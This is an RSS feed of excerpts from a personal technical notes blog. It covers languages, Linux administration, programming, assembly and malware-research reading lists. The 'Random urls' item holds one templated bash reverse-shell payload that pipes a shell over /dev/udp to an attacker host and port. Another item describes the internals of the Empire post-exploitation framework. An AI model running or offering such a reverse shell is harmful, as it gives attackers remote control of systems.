<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Down the wabbit&#39;s hole</title>
    <link>https://www.dinudev.com/post/</link>
    <description>Recent content in Posts on Down the wabbit&#39;s hole</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 07 Jul 2020 22:09:00 +0200</lastBuildDate>
    
	<atom:link href="https://www.dinudev.com/post/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Dutch</title>
      <link>https://www.dinudev.com/post/dutch/</link>
      <pubDate>Tue, 07 Jul 2020 22:09:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/dutch/</guid>
      <description>Letter pronunciation:  odd letters:  g: hei(gutural h) h: ha j: iei q: cu w: uei   vowel combinations(diphtongs):HB8zTn7wF91xCksxx7aB2kD2  ij:  normally &amp;ldquo;ai&amp;rdquo; inside -lijk: &amp;ldquo;uh&amp;rdquo;   ou and au: &amp;ldquo;au&amp;rdquo; oe: &amp;ldquo;uu&amp;rdquo; ui: &amp;ldquo;au&amp;rdquo; eu: &amp;ldquo;eou&amp;rdquo; eeuw / ieuw: &amp;ldquo;eeu&amp;rdquo; / &amp;ldquo;ieu&amp;rdquo;   consonant combinations:  ch: g or &amp;ldquo;ș&amp;rdquo; sj: &amp;ldquo;ș&amp;rdquo; sch: sg ng: nasal &amp;ldquo;nnnn&amp;rdquo;   misc:  c can be pronounced as either s or k i:  short as &amp;ldquo;e&amp;rdquo; long as &amp;ldquo;i&amp;rdquo; when in words ending with -ig or -is: &amp;ldquo;ă&amp;rdquo;   q:  only used in foreign words followed by u: &amp;ldquo;kuh&amp;rdquo;   v:  prononunced quite close to f   w(&amp;ldquo;uei&amp;rdquo;):  when followed by r it is pronounced v: wraak   y(y-grec):  as i: xylofoon as j: rayon   letters that swap pronunciation at the end of the word:       hard soft     b p   d t    Verbs and pronouns:  subject forms of the personal pronoun:      enkelvoud(singular) meervoud(plural)     1e persoon(1st person) ik wij/we   2e persoon(2nd person) jij/je(informeel), u(formeel) jullie(informeel), u(formeel)   3e persoon(3rd person) hij(mannelijk), zij/ze(vrouwelijk), het(neuter) zij/ze     tenses:  present tense:  verbs followed by jij or je drop the ending -t verb ending for u is always -t verbs with stems that end in -t or -d:  -t do not add another t -d add a t or drop the -d when inverted(followed by jij or je)   irregular infinitives:  some one-syllable verbs have a stem ending in simply -n   spelling in verb conjugation          enkelvoud meervoud     1e persoon stem stem + en   2e persoon stem + t stem + en   3e persoon steam + t steam + en    Misc:  geen and niet(no, none, not):  geen is used for nouns niet for other types of words    Nouns:   het / de rules:   </description>
    </item>
    
    <item>
      <title>Red Hat</title>
      <link>https://www.dinudev.com/post/rh/</link>
      <pubDate>Tue, 07 Jul 2020 00:00:00 +0000</pubDate>
      
      <guid>https://www.dinudev.com/post/rh/</guid>
      <description>Virtual machines and automated installations:  what is kvm(kernel-based virtual machine)?  a kernel module that allows compatible processors to run vms() each vm is a regular process each vm has dedicated virtual hardware   how do you configure it on a fresh install?:  install:  # yum install &amp;quot;Virtualization Host&amp;quot; &amp;quot;Virtualization Client&amp;quot;:  qemu-kvm: main kvm package libvirt: hypervisor manager as a daemon libvirt-client: virsh and the API that controls vms virt-install virt-manager: GUI virsh virt-top virt-viewer: GUI to connect to vm consoles   check for kernel modules:  # lsmod | grep kvm:  kvm_intelkvm kvm_amdkvm   if not enabled # modprobe kvm_intel or # modeprobe kvm_amd   enable if not enabled change images location:  ` $ mkdir &amp;lt;path/to/folder&amp;gt; $ su - root  semanage fcontext -a -t virt_image_t &amp;lsquo;&amp;lt;path/to/folder&amp;gt;(/.</description>
    </item>
    
    <item>
      <title>SQ3R Method</title>
      <link>https://www.dinudev.com/post/sq3r/</link>
      <pubDate>Sat, 04 Jul 2020 14:25:22 +0300</pubDate>
      
      <guid>https://www.dinudev.com/post/sq3r/</guid>
      <description>a typical student:  takes learning/reading as a chore reads the textbox mechanically and if anything is hard to understand, it just keeps reading reading is thought of in terms of quantity  effectivenes of &amp;ldquo;trial and error&amp;rdquo; student methods:   a test imediatelly after the learning session has 53% success in memory recollection
  a test after multiple rereadings averages about 70% retention
  reading 9, 8, 45, 6, 2, 4, 6, 8 just gives you the impressions that you learned the sequence because the numbers are familiar</description>
    </item>
    
    <item>
      <title>Networking</title>
      <link>https://www.dinudev.com/post/networking/</link>
      <pubDate>Thu, 02 Jul 2020 10:16:22 +0300</pubDate>
      
      <guid>https://www.dinudev.com/post/networking/</guid>
      <description>introduction in tcp/ip networking:  what is a network?:  multiple computers connected together eases the process of moving data from a computer to another   what is a networking model?  big vendors each had their own communication protocols, these propietary protocols would work for their devices but not combined with other devices ISO(international organization for standardization) first tried to standardize a less complex, vendor-neutral network model, which was OSI(open systems interconnection) key terms:  adjacent-layer interaction(communication between two layers on the same computer) same-layer interaction(communication at the same layer between two computers) de-encapsulation: remove and parse header and trailer metadata encapsulation: generate and add header and trailer metadata frame(PDU at data-link) packet(PDU at network layer) segment(PDU at transport layer) protocol data unit(PDU):  a generic way to refer to messages(segments, packets, frames) data unit that will be sent to the lower layer it contains:  current layer header higher layer data unit         what is tcp/ip?</description>
    </item>
    
    <item>
      <title>Developer Roadmap</title>
      <link>https://www.dinudev.com/post/developer_roadmap/</link>
      <pubDate>Fri, 26 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://www.dinudev.com/post/developer_roadmap/</guid>
      <description>Programming:   general:
  SICP - Abelson, Sussman
  Refactoring - Martin Fowler
  Domain Driven Design - Eric Evans
  introduction to algorithms - CLRS
  clean code - robert c. martin
  code complete 2 - mcconnell
  the pragmatic programmer - hunt, thomas
  the clean coder - robert c. martin
  Design Patterns - &amp;ldquo;Gang of Four&amp;rdquo;</description>
    </item>
    
    <item>
      <title>Malware Researcher Roadmap</title>
      <link>https://www.dinudev.com/post/malware_research_roadmap/</link>
      <pubDate>Thu, 25 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://www.dinudev.com/post/malware_research_roadmap/</guid>
      <description>Final goal:  malware researcher/analyst  Basics:  http://catb.org/%7Eesr/faqs/smart-questions.html math:  college linear algebra probability and statistics   networking:  CCNA   system administration:  https://www.reddit.com/r/sysadmin/wiki/learn https://www.reddit.com/r/sysadmin/wiki/bootcamp windows:  MCSE AD DC DNS DHCP GPO   linux: RHCSA7/8   tooling:  the ida pro book - eagle   reverse engineering:  Reversing: Secrets of Reverse Engineering - eldad eilam Reverse Engineering for Begginers - dennis yurichev   malware analysis:  begginer:  practical binary analysis - dennis andriesse practical malware analysis - sikorski, honig malware analyst&amp;rsquo;s cookbook - ligh, adair, hartstein, richard   middle:  Rootkits and Bootkits - matrosov, rodionov, bratus the rootkit arsenal - blunden the art of memory forensics(a long tutorial on volatility framework) - ligh   high:  the shellcoder&amp;rsquo;s handbook(very high level):  this might be out of date        After basics resources(understand thoroughly each and every item there):  https://github.</description>
    </item>
    
    <item>
      <title>SICP</title>
      <link>https://www.dinudev.com/post/sicp/</link>
      <pubDate>Mon, 22 Jun 2020 22:18:00 +0000</pubDate>
      
      <guid>https://www.dinudev.com/post/sicp/</guid>
      <description>Building Abstractions with Procedures:  complex software is built modularly so that the parts can be constructed, replaced and debugged separatedly three mechanisms to create complex expressions:  primitive expressions means of combinations: used to build compound elements from simpler ones means of abstraction: how compound elements can be named and manipulated as units   primitives:  data: stuff procedures: descriptions of the rules for manipulating data   tree accumulation:  evaluate the values of every child of the node(recursively) and THEN evaluate the value of the node   lexical scoping: variables in a procedure are bound by the enclosing block scope(they are looked up in the environment) block scoping: variables and definitions in a procedure are bound(private) to the scope of said procedure recursivity alone, enables every mathematical computation if tail-call optimization is present process types:  iterative:  the environment needs to only keep track of the counter and check if the limit was reached the program variables provide a complete description of the state of the process at any point a fixed number of state variables, a fixed rule that states how the variables should be updated as the process moves from state to state and optional end test that specifies the conditions under which the process should end   recursive:  procedure vs process:  a recursive procedure refers to itself a recursive process expresses the way a process evolves   the environment needs to keep track of the deffered operations     tail-recursivenes refers to an iterative process(in constant space) described as an recursive procedure  </description>
    </item>
    
    <item>
      <title>Bash</title>
      <link>https://www.dinudev.com/post/bash/</link>
      <pubDate>Sun, 14 Jun 2020 21:45:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/bash/</guid>
      <description>Environment variables:  HISTCONTROL:  don&amp;rsquo;t add to history certain lines options:  ignorespace: don&amp;rsquo;t add lines that start with a space ignoredups: don&amp;rsquo;t add duplicates ignoreboth: ignorespace AND ignoredups      Commands:  shopt:  toggle values of variables controlling shell behaviour:  -s: set option name  histappend: append instead of overwriting history list to file pointed by HISTFILE        Conditions:   -a: file exists</description>
    </item>
    
    <item>
      <title>Assembly</title>
      <link>https://www.dinudev.com/post/asm/</link>
      <pubDate>Fri, 17 Apr 2020 22:18:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/asm/</guid>
      <description>Assembly:  Single Instruction Multiple Data(SIMD):  paralelize instructions using multiple data points instead of adding 2 DWORDs, paralelize adding 8 DWORDS by adding 4 with another 4 at the same time    Endianness:  little endian: least significant byte first(x86/x86_64/AMD64) big endian: most significant byte first bi-endian: contain an instruction that allows for switchable endianness(ARM v3 and beyond)  Categories of operations:  load data store data modify data call a function  Memory segmentation:  x64 uses flat memory: there is only one memory segment  Stack:  the stack must be N bytes aligned:  SP must be a N bytes multiplier this simplifies read of data; data is read in less memory access cycles if the stack is N bytes aligned, the processor will read from one address the entire value if not the processor will have to read from two addresses and merge the result intel and AMD require 16-bytes alignment to execute SSE instructions corectly   growing downwards from the highest memory to the lowest bp is the start of the stack, sp is the top of the stack shadow store(spill space, home space, shadow space):  space allocated on the stack by the caller for the callee(to save registers used to pass arguments) the size is determined by the maximmum size supported(in x86_64 is 8 bytes) * number of registers used to pass parameters shadow store is not part of the stack frame   stack frame:  a frame of data that is placed on the stack structure:  return instruction pointer first allocate space for base pointer and local variables     actions:  pop: remove an item from the stack push: add an item on the stack   call:  types:  near call:  near relative(E8): add the address called to the address of the next instruction(directly) =&amp;gt; call some_function near absolute(FF): specify the call address in an mem store or reg(indirectly) =&amp;gt; call [rbx]   far call inter-privilege-level far call task switch   call tasks:  push IP on the stack jump to call address + next instruction address     ret:  transfers program controll to an address located on the top of the stack pop and jump to that address opcodes:  C3 C2      Calling conventions:  fastcall:  the stack must be alligned to a 16 byte boundary use 4 reg to pass parameters(left to right): rcx, rdx, r8, r9 any argument that doesn&amp;rsquo;t fit into a supported size(1, 2, 4, 8 bytes) will be passed by reference before the call, the caller allocates space on the stack   cdecl:  allocate space for any functions called in it first two arguments are stored in rsi and rdi   stdcall c++ thiscall  </description>
    </item>
    
    <item>
      <title>.NET</title>
      <link>https://www.dinudev.com/post/net/</link>
      <pubDate>Fri, 17 Apr 2020 13:00:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/net/</guid>
      <description>.NET:  structure:  runtime component languages compilers   platforms:  .NET Core .NET Framework Xamarin   it provides definitions for a set of Base Class Libraries(BCL) APIs to be implemented by all the platforms conforming to the standard  .NET Core:  components:  CoreCLR(Common Language Runtime):  open source refactoring of the original CLR manage usage and references to objects communication and interactions of objects written in the different languages supported garbage collection components:  garbage collector Just In Time(JIT) compiler Native interop:  allow managed(.</description>
    </item>
    
    <item>
      <title>Test Driven Development</title>
      <link>https://www.dinudev.com/post/tdd/</link>
      <pubDate>Fri, 17 Apr 2020 12:00:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/tdd/</guid>
      <description>Test Driven Development(TDD):  types:  unit tests:  test functionality in isolation used to test functionality at the lowest level of computation(method, function)   integration tests:  test the interaction and data exchange of multiple units types:  top-down: top-level components are integrated and tested first bottom-up: lower-level components are integrated and tested first big bang: everything is integrated and tested at once     system tests:  validate the entire integrated system performed imediatelly after integration tests testing is made from the users perspective made with real data     principles:   write the tests:  the test are a form of documentation    write the code:  write just enough to pass the test    run the tests:  if they fail, rewrite the tests or the code    refactor:  the tests or code until full coverage is achieved remove duplicates attempt to fix any signs of code smell make changes gradually, one test at a time      red-green-refactor:  red: add a failing test green: make it work refactor    </description>
    </item>
    
    <item>
      <title>Sandbox</title>
      <link>https://www.dinudev.com/post/sandbox/</link>
      <pubDate>Tue, 14 Apr 2020 22:00:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/sandbox/</guid>
      <description>Architecture: Goals:  fully open source(gpl 3 compilant) highly scallable and redundant(HA proxies and containers) support windows, linux and macos  Requisites:  backend controller: c#/asp.net core agents: c/c++(rust?) ui: js/react database: mysql or postgresql  Development roadmap:  think of a name:  Wiccan Ocelote   build the backend:  multiple database connections(db HA) multiple backends behind http HA architect a simple db schema add report schema:  static analysis string data disk usage binary data network usage binary data   add login   build agent for windows:  functionality:  system information and status monitor disk writes monitor network writes ultimately monitor api calls send executable and perform static analysis(create report)      </description>
    </item>
    
    <item>
      <title>PowerShell</title>
      <link>https://www.dinudev.com/post/powershell/</link>
      <pubDate>Fri, 10 Apr 2020 07:00:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/powershell/</guid>
      <description>Snap-ins:  ms is moving away from the concept of snapins and more thowards modules structure:  name: PSSnapin files:  one or more dlls 0 or more xml configuration files     they have to be installed and registered to be used control:  Add-PSSnapin Remove-PSSnapin Get-PSSnapin   help for loaded snapins: Get-Command -PSSnapin &amp;lt;snapinname&amp;gt;  Modules:  more self-contained and easier to distribute they dont need registration, ps will look in certain paths when searching for a command ($env:PSModulePath) if a module is not in modulepath you can add it with Import-Module if multiple modules are loaded and have a command with the same name, the last loaded module&amp;rsquo;s command will be called user modules location: $Home\Documents\WindowsPowerShell\Modules  Profiles:  a script that is run on shell init system profiles location: a profile location:  current user, current host:  $PROFILE.</description>
    </item>
    
    <item>
      <title>C#</title>
      <link>https://www.dinudev.com/post/csharp/</link>
      <pubDate>Fri, 03 Apr 2020 18:59:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/csharp/</guid>
      <description>General:  expression-bodied members: public string Func(param) =&amp;gt; &amp;quot;result&amp;quot; + param string interpolation: var str = &amp;quot;string&amp;quot;; $&amp;quot;This is a {string}&amp;quot; using static: public class Cls { public static string staticString = &amp;#34;str&amp;#34;; } using static Cls; Console.WriteLine(staticString)  deconstruction: public static (string, int) Func(string) { var rnd = new Random(); return (string, rnd.Next()); } var (someString, someInt) = Func(&amp;#34;test&amp;#34;); // with types (string someString, int someInts) = Func(&amp;#34;test&amp;#34;); // with discards (\_, someInt) = Func(&amp;#34;test&amp;#34;);  blazor are razor pages running in the browser, a mono runtime compiled to web assembly Func&amp;lt;string, int, decimal&amp;gt;: a delegate type with string, int parameters and decimal return type delegate that does not return a value:  Action Action&amp;lt;T&amp;gt;(T is the param to the delegate)    Generics:  type safety at compile time without knowing the type beforehand  Representing nullable values: *</description>
    </item>
    
    <item>
      <title>COM</title>
      <link>https://www.dinudev.com/post/com/</link>
      <pubDate>Fri, 03 Apr 2020 18:59:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/com/</guid>
      <description>COM(Component Object Model):  the designers took the best of classical, academic OOP and the best from their experiences, took into account human nature and capitalism although the main focus is encapsulation, not inheritance, COM relies on interface inheritance and much less so on implementation inheritance  </description>
    </item>
    
    <item>
      <title>Math</title>
      <link>https://www.dinudev.com/post/math/</link>
      <pubDate>Tue, 31 Mar 2020 22:53:07 +0300</pubDate>
      
      <guid>https://www.dinudev.com/post/math/</guid>
      <description>General:  along with the basics(numbers and operations with numbers) go for:  ch8 #1 ch9 #1,#2(adition of pair numbers and the geometric interpretation)    Ch1:  operations with numbers relations among numbers properties of the relations among numbers:  addition multiplication inequalities positivity square roots n-th roots   #1 =&amp;gt; Integers:  countable numbers: 1, 2, 3, .... , n natural numbers(positive integers): 0, 1, 2, 3, .</description>
    </item>
    
    <item>
      <title>Classical Music</title>
      <link>https://www.dinudev.com/post/music_classical/</link>
      <pubDate>Sat, 28 Mar 2020 21:49:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/music_classical/</guid>
      <description>   Composer Name Subname     Verdi Requiem    vivaldi four seasons summer III presto   beethoven egmont    beethoven 5th    mussorgsky night on bald mountain    mozart nachtmusik    janacek glagolitic mass    Chopin Etudes and Preludes    Rimsky-Korsakov Scheherazade op.35   gustav holst the planets    Maurice Ravel Bolero     </description>
    </item>
    
    <item>
      <title>Windows</title>
      <link>https://www.dinudev.com/post/windows/</link>
      <pubDate>Mon, 16 Mar 2020 17:19:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/windows/</guid>
      <description>Major Versions:  XP(2001) 5.1 Vista(2007) 6.0 7(2009) 6.1 8(2012) 6.2 8.1(2013) 6.3 10(2015) 10  Component Object Model(COM):  originally created to enable Office apps to communicate and exchange data between documents (Object Linking and Embedding - OLE) principles:  clients communicate with objects(COM server objects) through interfaces component implementation is loaded dynamically rather than begin statically linked to the client   it tipically refers to a DLL or EXE where the COM classes are implemented  Windows Runtime(WinRT):  platform services aimed particularlly at app developers for Windows Apps(Windows Store Apps) can target multiple device form factors(IoT, phones, tablets, desktops, xbox, hololens) built on top of COM  .</description>
    </item>
    
    <item>
      <title>Random urls</title>
      <link>https://www.dinudev.com/post/random_urls/</link>
      <pubDate>Mon, 09 Mar 2020 15:36:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/random_urls/</guid>
      <description>Urls:  https://www.viewbug.com/member/beamieyoung https://mirelapetcu.com/ tejal mewar https://lindahollinger.photography/ federica molinari http://www.kalua.pl/gallery/collodion-between-two-moons/ https://pattycarroll.com/ https://unix.stackexchange.com/questions/47082/how-to-improve-windows-perfomance-when-running-inside-kvm https://www.linuxtechi.com/create-revert-delete-kvm-virtual-machine-snapshot-virsh-command/ https://dennisnotes.com/note/20180614-ubuntu-18.04-qemu-setup/ http://www.azertech.net/content/windows7-kvm-qemu-qcow2-snapshots https://kerneltalks.com/disk-management/how-to-guide-lvm-snapshot/ http://heim.ifi.uio.no/~trygver/themes/mvc/mvc-index.html Millions of programmers die every year from hope-influenced asphyxiation leo brouwer lera lynn - out to sea toread uber migration from pg to mysql sandboxing implementation sandboxing linux Bit Twiddling Hacks nsarchive public intelligence KVM API fossil vault rsync.net cryptoparty.in re basics linkers bios related bios related git&amp;rsquo;s source repo rutkowska&amp;rsquo;s blog pentesterland corelan 0&amp;lt;&amp;amp;#{rand_fd}-;exec #{rand_fd}&amp;lt;&amp;gt;/dev/udp/#{LHOST}/#{LPORT};echo&amp;gt;&amp;amp;#{rand_fd};sh &amp;lt;&amp;amp;#{rand_fd} &amp;gt;&amp;amp;#{rand_fd} 2&amp;gt;&amp;amp;#{rand_fd} statistics robert graham microphones linux network programming programming languages grapheneos trackthis sourcemaking devdocs informatic post mortems re heaven research.</description>
    </item>
    
    <item>
      <title>Russian</title>
      <link>https://www.dinudev.com/post/russian/</link>
      <pubDate>Sat, 07 Mar 2020 02:02:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/russian/</guid>
      <description>Social media urls:  https://vk.com/ https://ok.ru/ https://mail.ru/ https://www.avito.ru/rossiya  News urls:  https://www.pravdareport.com/ https://meduza.io/ https://www.themoscowtimes.com/ https://tass.ru/ https://russia-insider.com/en  Learning urls:  http://masterrussian.com/ http://www.russianlessons.net/  Random urls:  https://forum.ixbt.com/ https://civitas.ru/forum.php https://www.sql.ru/forum http://www.ourprivate.net/forum/index.php https://forum.privet.com/ https://club443.ru/ https://rsdn.org/ https://russificateforum.com/ https://cooljugator.com/ru/  General Grammar:   End of word consonants are pronounced like their voiceless counterparts:
         б п   в ф   г к   д т   ж ш   з с      Consonants are voiceless when followed by other voiceless consonants and the other way around</description>
    </item>
    
    <item>
      <title>Javascript</title>
      <link>https://www.dinudev.com/post/javascript/</link>
      <pubDate>Mon, 02 Mar 2020 13:14:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/javascript/</guid>
      <description>react:  lifecycle phases + hooks:  mount:  creation: ReactDOM.render() getDefaultProps() / MyComponent.defaultProps getInitialState() / this.state = ... render() children initialization componentDidMount()   update:  shouldComponentUpdate() render() children lifecycle methods componentDidUpdate()   unmount:  componentWillUnmount() children lifecycle methods instance destroyed for gc      prototype:  when objects are created they do not come with the myrad of metadata as inheriting classes in classical oop do, they are buckets of data, key-value pairs how this is resolved:  directly: this will refer to the global object, window(browser)/global(nodejs) as a method: this will refer to the object that the func is a part of explicitly applied:  call: object to be this as first param, and the rest of the params as positional apply: object to be this as first param, and the rest of the params as an array in the second param bind: object to be this as first param   as a constructor    object-literal pattern:  organize code by the behaviour it comprises keeps your code from polluting the global namespace  To read:  https://github.</description>
    </item>
    
    <item>
      <title>RE and Malware RE</title>
      <link>https://www.dinudev.com/post/re_malware_re/</link>
      <pubDate>Mon, 02 Mar 2020 13:14:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/re_malware_re/</guid>
      <description>For reverse engineering:  Practical Reverse Engineering - Bruce Dang Reversing Secrets Engineering - Eldad Eilam The IDA Pro Book - Chris Eagle  For malware analysis and malware techniques:  Practical Malware Analysis - Michael Sikorski, Andrew Honig Malware Analyst&amp;rsquo;s Cookbook - Michael Ligh, Steven Adair, Blake Hartstein, Matthew Richard The Art of Memory Forensics - Michael Hale Ligh, Andrew Case, Jamie Levy, AAron Walters  For programming:  Complete Reference C and Complete Reference C++ NASM Manual Intel Software Developer Manual (http://www.</description>
    </item>
    
    <item>
      <title>Russian Dictionary Of Irregular Stuff</title>
      <link>https://www.dinudev.com/post/russian_dictionary/</link>
      <pubDate>Mon, 02 Mar 2020 13:14:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/russian_dictionary/</guid>
      <description>   ru_word ru_pronunciacion en_translation ru_plural ru_plural_pronunciacion gender     день dieni day/afternoon дени dieni m   путь puti path   m   рубль rubli rouble   m   камень camieni stone   m   родитель raditieli parents   m   уровень uravieni level   m   лагерь lagheri camp   m   корабль carabli ship   m   конь coni horse/knight(in chess)   m           господь gaspoti god/the lord   m   медведь miedvieti bear медведи miedviedi m   гость gosti guests   m   парень parieni boy/fellow/guy   m   король caroli king   m   царь țari tzar/czar/king/ruler  m    зверь zvieri wild animal/beast   m   житель jitieli inhabitant/resident/dweller   m   секретарь siecrietari secretary   m           учитель ucitieli teacher/instructor   m   писатель pisatieli writer   m   читатель citatieli reader   m           ночь nocha night   f   очень приятно oceni priatna pleased(very pleasant) tot meet you      кровать cravati bed   f   дверь dvieri door двери dvieri f   кравать cravati bed   f   кровь crofi blood   f   вещь vieși thing/stuff/matter   f   помощь pomosi help/assistance/support/relief/aid   f   мышь mâiș mouse мыши mâiși f   мать mati mother   f   жизнь jizni life   f   часть chasti part/share/department   f   мысль mâsli thought/ideea   f   смерть smierti death   f   власть vlasti power   f   любовь liubofi love   f   возможность vazmojnasti possibility   f   грудь grudi breast/chest   f   огонь agoni fire   f   очередь ochierieti line/queue/turn   f   боль boli pain   f   речь riechi speech   f   связь sviazi bond/tie/connection/relation   f   цель țieli goal/object/target   f   знать znati aristocracy/nobility/the elite   f   память pamiati memory   f   ладонь ladoni palm   f   болезнь baliezni disease   f   роль roli role   f   дочь doci daughter   f   тень tieni shadow   f   лошадь loșati horse   f   площадь ploșati square/area   f   область oblasti oblast/province/field   f   деятельность dieiatielinăsti activiti   f   степень stiepieni degree/extent/power(in mathematics)   f   пыиль pâili dust/sprai   f   даль dali distance(in poetry)/long way off   f   председатель priedsiedatieli chairman/president   m   честь ciesti honour/regard/respect   f   кость costi bone   f   личность lichinăsti personality/person   f   скорость scorosti speed   f    </description>
    </item>
    
    <item>
      <title>CRS File Format</title>
      <link>https://www.dinudev.com/post/crs_file_format/</link>
      <pubDate>Sun, 01 Mar 2020 18:32:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/crs_file_format/</guid>
      <description>Goals:  learn about file formats obfuscate files  File format:  encrypt the raw data from the file and write to an image(RAW) compute header items dynamic addresses based on RAW size:  header items addresses should not be linked in any way (if you know one address you should not be able to deduce/compute the others)    </description>
    </item>
    
    <item>
      <title>Computer Science</title>
      <link>https://www.dinudev.com/post/cs/</link>
      <pubDate>Sun, 01 Mar 2020 17:22:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/cs/</guid>
      <description>General:  everything that is tedious is error-prone try to design your types so that values are guaranteed to be valid:  hide the representation provide a constructor that creates only valid objects design all member functions to expect valid values and leave only valid values behind when they return   a rule for what constitues an valid values is an invariant types for objects in main memory is the same as formats for files on disk  Interface construction rules:  keep interfaces complete keep interfaces minimal provide constructors support copying(or prohibit it) use types to provide good argument checking identify nonmodifying member functions free all resources in the destructor  Attributes of a program:  should produce the desired results for all legal inputs should give reasonable error messages for all ilegal imputs need not worry about misbehaving hardware need not worry about misbehaving system software is allowed to terminate after finding an error  Approaches to acceptable software:  organize software to minimize errors eliminate most of the errors we made through debugging and testing make sure the remaining errors are not serious  Sources of errors:  Poor specification: if we are not specific of the software functionality we can&amp;rsquo;t asses the &amp;ldquo;dark corners&amp;rdquo; and make sure all cases are handled Incomplete programs: know when you handled all the cases Unexpected arguments Unexpected input Unexpected state Logical Errors: code that simply does not do what is supposed to do  Types of errors:  compile-time:  syntax errors type errors(values assigned to variables of the wrong tipe) non-errors(area(10, -7), a rectangle can&amp;rsquo;t have a negative width, but the pc can&amp;rsquo;t know that)   link-time:  every function in the program must be declared with exactly the same type in every translation unit in which is used every function must be defined exactly once in the program   run-time logic errors  Debugging:  how would i know if the program actually worked correctly?</description>
    </item>
    
    <item>
      <title>Design Patterns</title>
      <link>https://www.dinudev.com/post/design_patterns/</link>
      <pubDate>Fri, 28 Feb 2020 11:35:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/design_patterns/</guid>
      <description>Creational: Factory:  a class that creates other classes when to use:  the object setup requires a high level of complexity generation of different objects is needed based on environment when working with many small objects that share the same properties    Abstract Factory:  to be used when a system needs to be decouple from the way objects are generated the system needs to work with multiple objects  Mixin:  a bucket of reusable functionality(think of traits in php) collect functionality through extension it is argued it creates object pollution it is argued it adds an level of uncertainty regarding the origin of the functions(in large systems)  Properties:  create objects based on a template of an existing object through cloning in js Object.</description>
    </item>
    
    <item>
      <title>Empire Framework Notes</title>
      <link>https://www.dinudev.com/post/empire/</link>
      <pubDate>Wed, 26 Feb 2020 12:37:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/empire/</guid>
      <description>setup:  based on some distro detection techniques, install prerequisites and powershell(.dotnetcore) works with python 2 and/or 3 setup database from setup/setup_database.py:  sqlite3 setup users and passwords:      config:      staging_key text   install_path text   ip_whitelist text   ip_blacklist text   autorun_command text   autorun_data text   rootuser boolean   api_username text   api_password text   api_current_token text   api_permanent_token text   obfuscate integer   obfuscate_command text         agents:      id integer   session_id text   listener text   name text   language text   language_version text   delay integer   jitter real   external_ip text   internal_ip text   username text   high_integrity integer   process_name text   process_id text   hostname text   os_details text   session_key text   nonce text   checkin_time text   lastseen_time text   parent text   children text   servers text   profile text   functions text   kill_date text   working_hours text   lost_limit integer   taskings text   results tex         listeners:      id integer   name text   module text   listener_type text   listener_category text   enabled boolean   options blo         credentials:      id integer   credtype text   domain text   username text   password text   host text   os text   sid text   notes tex         taskings:      id integer   data text   agent text         results:      id integer   data text   agent text         reporting:      id integer   name text   event_type text   message text   time_stamp text   taskID integer         generate a self-signed certificate install python req:  network tools setup tools cryptographic tools iptools(manipulate ipv4/ip6 addresses) pydispatcher(signal dispatching mechanism) web framework(flask/jinja) pe/macho header readers dropbox(api wrapper) pyOpenSSL(openssl wrapper) pyinstaller(make an exe) zlib_wrapper netifaces(portable network interface information) pyminifier(minifier,obfuscator,compressor) xlutils(work with excel files)    architecture:  structure:  listeners:  pivot hop foreign   stagers(.</description>
    </item>
    
    <item>
      <title>Random Notes</title>
      <link>https://www.dinudev.com/post/random_notes/</link>
      <pubDate>Mon, 24 Feb 2020 15:44:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/random_notes/</guid>
      <description>Network upgrade:   Before:
 3.65 dl 1.74 up Connection failed 0.25 dl 0.01 up 0.56 dl 0.00 up 0.12 dl 0.00 up    After
 4.91 dl 6.61 up 10.1 dl 6.09 up 9.08 dl 7.44 up 16.4 dl 7.04 up 11.9 dl 6.03 up    Some algorithm:  get a directory and a hash in directory there can be 0 or more children if there are more than 0 children get the hash keys of the children iterate through the keys truncate the curent key to the hash size and compare them if they are the same, if the child is a file return the file path, if the child is a directory, goroutine recursively else go to the next if no match is found, return nil  How to be as pompous as you can:  only the awake may think seeing is for open eyes cognition is a lie i dream the world awake dreaming is a vestige sleep is pretend a dream is a cowardly thought sleep is not civilized the mind is a tyrant this is your time now i will never dream again stay out of your bedrom there is work to be done dreams are just screaming with pictures the pure of mind do not slumber no good thought follows instinct the lie of sleep seeks many vessels we are our own gods let cognizance nourish itself logic is the final burden the primitive mind deserves its nightmares when we sleep we die i am an idea thinking itself they are no faces the subconscious is a parasite dreaming is a cancer on the face of sleep they follow night to bleed dreams your home has another door unconsciousness is a threat we are not meant to dream you owe the messenger what is true unmakes the false sleep is a scavenger this message will repeat until there are none to read it  Set &amp;ldquo;offline&amp;rdquo; in lol chat:  RADS &amp;gt; Projects &amp;gt; lol_air_client_config_[your server here] &amp;gt; releases &amp;gt; 0.</description>
    </item>
    
    <item>
      <title>Stoicism</title>
      <link>https://www.dinudev.com/post/stoicism/</link>
      <pubDate>Mon, 24 Feb 2020 11:29:00 +0200</pubDate>
      
      <guid>https://www.dinudev.com/post/stoicism/</guid>
